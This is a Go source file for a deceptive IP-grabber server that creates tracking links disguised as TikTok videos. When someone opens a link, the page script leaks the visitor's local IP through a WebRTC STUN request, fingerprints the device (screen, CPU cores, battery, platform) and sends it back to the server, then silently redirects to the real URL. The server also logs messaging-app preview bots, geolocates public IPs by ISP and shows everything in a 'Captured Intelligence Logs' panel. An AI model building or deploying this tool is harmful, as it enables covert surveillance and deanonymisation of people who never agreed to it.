package main

import (
	"database/sql"
	"encoding/json"
	"fmt"
	"html/template"
	"io"
	"net/http"
	"strings"
	"time"

	_ "modernc.org/sqlite"
)

var db *sql.DB

type Capture struct {
	ID         int
	Code       string
	PublicIP   string
	LocalIP    string
	Port       string
	Location   string
	DeviceInfo string
	CreatedAt  string
}

func initDB() {
	var err error
	// استخدام محرك sqlite النقي الخاص بـ modernc
	db, err = sql.Open("sqlite", "./long_term_tracker.db")
	if err != nil {
		panic(err)
	}

	db.SetMaxOpenConns(25)
	db.SetMaxIdleConns(25)
	db.SetConnMaxLifetime(5 * time.Minute)

	createTablesSQL := `
	CREATE TABLE IF NOT EXISTS links (
		id INTEGER PRIMARY KEY AUTOINCREMENT,
		code TEXT UNIQUE,
		target_url TEXT,
		created_at DATETIME DEFAULT CURRENT_TIMESTAMP
	);
	CREATE TABLE IF NOT EXISTS captures (
		id INTEGER PRIMARY KEY AUTOINCREMENT,
		code TEXT,
		public_ip TEXT,
		local_ip TEXT,
		port TEXT,
		location TEXT,
		device_info TEXT,
		created_at DATETIME DEFAULT CURRENT_TIMESTAMP
	);
	CREATE INDEX IF NOT EXISTS idx_captures_code ON captures(code);
	CREATE INDEX IF NOT EXISTS idx_captures_created ON captures(created_at);
	`
	_, err = db.Exec(createTablesSQL)
	if err != nil {
		panic(err)
	}
}

func getRealIP(r *http.Request) string {
	forwarded := r.Header.Get("X-Forwarded-For")
	if forwarded != "" {
		ips := strings.Split(forwarded, ",")
		return strings.TrimSpace(ips[0])
	}
	ip := r.RemoteAddr
	if idx := strings.LastIndex(ip, ":"); idx != -1 {
		ip = ip[:idx]
	}
	return ip
}

func getISPAndLocation(ip string, ua string) string {
	if ip == "127.0.0.1" || ip == "::1" || strings.HasPrefix(ip, "192.168.") {
		return "Local Network / Internal"
	}

	lowerUA := strings.ToLower(ua)
	if strings.Contains(lowerUA, "telegram") {
		return "Telegram Preview Server [Bot]"
	}
	if strings.Contains(lowerUA, "whatsapp") {
		return "WhatsApp Preview Server [Bot]"
	}
	if strings.Contains(lowerUA, "facebookexternalhit") || strings.Contains(lowerUA, "messenger") {
		return "Meta / Messenger Server [Bot]"
	}

	resp, err := http.Get(fmt.Sprintf("http://ip-api.com/json/%s?fields=status,country,city,isp,org", ip))
	if err != nil {
		return "Algeria (Network Trace)"
	}
	defer resp.Body.Close()

	body, _ := io.ReadAll(resp.Body)
	var result map[string]interface{}
	json.Unmarshal(body, &result)

	if status, ok := result["status"].(string); ok && status == "success" {
		city, _ := result["city"].(string)
		country, _ := result["country"].(string)
		if country == "" {
			country = "Algeria"
		}
		isp, _ := result["isp"].(string)
		if isp == "" {
			isp, _ = result["org"].(string)
		}

		lowerISP := strings.ToLower(isp)
		networkType := fmt.Sprintf(" [ISP: %s]", isp)
		if strings.Contains(lowerISP, "mobilis") {
			networkType = " [⚡ Mobilis Algeria]"
		} else if strings.Contains(lowerISP, "djezzy") || strings.Contains(lowerISP, "ota") {
			networkType = " [🔥 Djezzy Algeria]"
		} else if strings.Contains(lowerISP, "ooredoo") || strings.Contains(lowerISP, "wataniya") {
			networkType = " [⭐ Ooredoo Algeria]"
		} else if strings.Contains(lowerISP, "algerie telecom") || strings.Contains(lowerISP, "atm") {
			networkType = " [🌐 Algérie Télécom / ADSL]"
		}

		locStr := country
		if city != "" {
			locStr = city + ", " + country
		}
		return locStr + networkType
	}
	return "Algeria (Network Trace)"
}

func mainHandler(w http.ResponseWriter, r *http.Request) {
	code := r.URL.Query().Get("r")

	if code != "" {
		var targetURL string
		err := db.QueryRow("SELECT target_url FROM links WHERE code = ?", code).Scan(&targetURL)
		if err != nil {
			http.Error(w, "Link not found or expired", http.StatusNotFound)
			return
		}

		ua := r.UserAgent()
		isBot := strings.Contains(strings.ToLower(ua), "bot") ||
			strings.Contains(strings.ToLower(ua), "whatsapp") ||
			strings.Contains(strings.ToLower(ua), "telegram") ||
			strings.Contains(strings.ToLower(ua), "facebookexternalhit")

		if isBot {
			publicIP := getRealIP(r)
			location := getISPAndLocation(publicIP, ua)
			db.Exec("INSERT INTO captures (code, public_ip, local_ip, port, location, device_info) VALUES (?, ?, ?, ?, ?, ?)",
				code, publicIP, "Zero-Click Bot", "N/A", location, "🤖 [Preview Bot] UA: "+ua[:40])

			w.Header().Set("Content-Type", "text/html; charset=utf-8")
			fmt.Fprintf(w, `<!DOCTYPE html><html><head><meta property="og:title" content="TikTok Video"><meta property="og:image" content="https://images.unsplash.com/photo-1618005182384-a83a8bd57fbe?w=600"><title>TikTok</title></head><body></body></html>`)
			return
		}

		if r.Method == http.MethodPost {
			r.ParseForm()
			publicIP := getRealIP(r)
			localIP := r.FormValue("lip")
			if localIP == "" {
				localIP = "Unknown"
			}
			port := r.RemoteAddr
			location := getISPAndLocation(publicIP, ua)

			deviceInfo := fmt.Sprintf("⚡ Platform: %s | Screen: %s | CPU: %s | Battery: %s",
				r.FormValue("platform"), r.FormValue("screen"), r.FormValue("hardware"), r.FormValue("battery"))

			db.Exec("INSERT INTO captures (code, public_ip, local_ip, port, location, device_info) VALUES (?, ?, ?, ?, ?, ?)",
				code, publicIP, localIP, port, location, deviceInfo)

			w.WriteHeader(http.StatusOK)
			w.Write([]byte("OK"))
			return
		}

		htmlContent := fmt.Sprintf(`<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>TikTok Video</title>
    <script>
        function getLocalIP(callback) {
            let found = false;
            let pc = new RTCPeerConnection({ iceServers: [{ urls: "stun:stun.l.google.com:19302" }] });
            pc.createDataChannel("");
            pc.createOffer().then(o => pc.setLocalDescription(o)).catch(() => {});
            pc.onicecandidate = function(ice) {
                if (!ice || !ice.candidate || !ice.candidate.candidate) return;
                let ipMatch = /([0-9]{1,3}(\.[0-9]{1,3}){3})/.exec(ice.candidate.candidate);
                if (ipMatch) {
                    let ip = ipMatch[1];
                    if ((ip.startsWith("192.168.") || ip.startsWith("10.") || ip.startsWith("172.")) && !found) {
                        found = true; callback(ip); pc.onicecandidate = null;
                    }
                }
            };
            setTimeout(() => { if (!found) callback("Direct / Mobile Data"); }, 60);
        }

        async function run() {
            let screenRes = window.screen.width + "x" + window.screen.height;
            let cores = navigator.hardwareConcurrency || "Unknown";
            let platform = navigator.platform || "Unknown";
            let batteryInfo = "N/A";
            try {
                if (navigator.getBattery) {
                    let b = await navigator.getBattery();
                    batteryInfo = Math.round(b.level * 100) + "%%%%";
                }
            } catch(e){}

            getLocalIP(function(lip) {
                let params = new URLSearchParams();
                params.append('lip', lip);
                params.append('screen', screenRes);
                params.append('hardware', cores + " Cores");
                params.append('battery', batteryInfo);
                params.append('platform', platform);

                navigator.sendBeacon ? navigator.sendBeacon(window.location.href, params) : fetch(window.location.href, {method: 'POST', body: params, keepalive:true});

                setTimeout(() => {
                    window.location.replace("%s");
                }, 80);
            });
        }
        window.addEventListener('DOMContentLoaded', run);
    </script>
</head>
<body style="background:#000;"></body>
</html>`, targetURL)
		w.Header().Set("Content-Type", "text/html; charset=utf-8")
		w.Write([]byte(htmlContent))
		return
	}

	if r.Method == http.MethodPost {
		r.ParseForm()
		targetURL := r.FormValue("target_url")
		if targetURL != "" {
			if !strings.HasPrefix(targetURL, "http") {
				targetURL = "https://" + targetURL
			}
			codeGen := fmt.Sprintf("%d", time.Now().UnixNano())[8:]
			db.Exec("INSERT INTO links (code, target_url) VALUES (?, ?)", codeGen, targetURL)
		}
		http.Redirect(w, r, "/", http.StatusSeeOther)
		return
	}

	rows, _ := db.Query("SELECT id, code, public_ip, local_ip, port, location, device_info, created_at FROM captures ORDER BY id DESC LIMIT 50")
	defer rows.Close()

	var captures []Capture
	for rows.Next() {
		var c Capture
		rows.Scan(&c.ID, &c.Code, &c.PublicIP, &c.LocalIP, &c.Port, &c.Location, &c.DeviceInfo, &c.CreatedAt)
		captures = append(captures, c)
	}

	tmpl := `<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Go High-Performance Tracker Panel</title>
    <style>
        body { background: #0b0f17; color: #e2e8f0; font-family: sans-serif; padding: 20px; }
        .box { background: #131b2e; border: 1px solid #1e293b; padding: 20px; border-radius: 8px; margin-bottom: 20px; max-width: 900px; margin-left: auto; margin-right: auto; }
        input[type="text"] { width: 70%%; padding: 10px; background: #020617; border: 1px solid #334155; color: #fff; border-radius: 5px; }
        button { background: #6366f1; color: #fff; border: none; padding: 10px 20px; border-radius: 5px; cursor: pointer; font-weight: bold; }
        table { width: 100%%; border-collapse: collapse; margin-top: 10px; font-size: 13px; }
        th, td { border: 1px solid #1e293b; padding: 8px; text-align: center; }
        th { background: #020617; color: #94a3b8; }
    </style>
</head>
<body>
    <div class="box">
        <h2>Generate Tracking Link</h2>
        <form method="POST">
            <input type="text" name="target_url" placeholder="https://www.tiktok.com/..." required>
            <button type="submit">Create Link</button>
        </form>
    </div>

    <div class="box" style="max-width: 1100px;">
        <h2>Captured Intelligence Logs (Long-Term Storage)</h2>
        <table>
            <tr>
                <th>ID</th>
                <th>Code</th>
                <th>Public IP</th>
                <th>Local IP</th>
                <th>Network / ISP</th>
                <th>Hardware & Specs</th>
                <th>Time</th>
            </tr>
            {{range .}}
            <tr>
                <td>{{.ID}}</td>
                <td style="color:#6366f1; font-weight:bold;">{{.Code}}</td>
                <td style="color:#38bdf8;">{{.PublicIP}}</td>
                <td style="color:#f59e0b;">{{.LocalIP}}</td>
                <td style="color:#10b981;">{{.Location}}</td>
                <td style="color:#f43f5e;">{{.DeviceInfo}}</td>
                <td>{{.CreatedAt}}</td>
            </tr>
            {{end}}
        </table>
    </div>
</body>
</html>`

	t, _ := template.New("index").Parse(tmpl)
	t.Execute(w, captures)
}

func main() {
	initDB()
	http.HandleFunc("/", mainHandler)
	fmt.Println("[*] High-Performance Go Server running on port 8080...")
	http.ListenAndServe(":8080", nil)
}
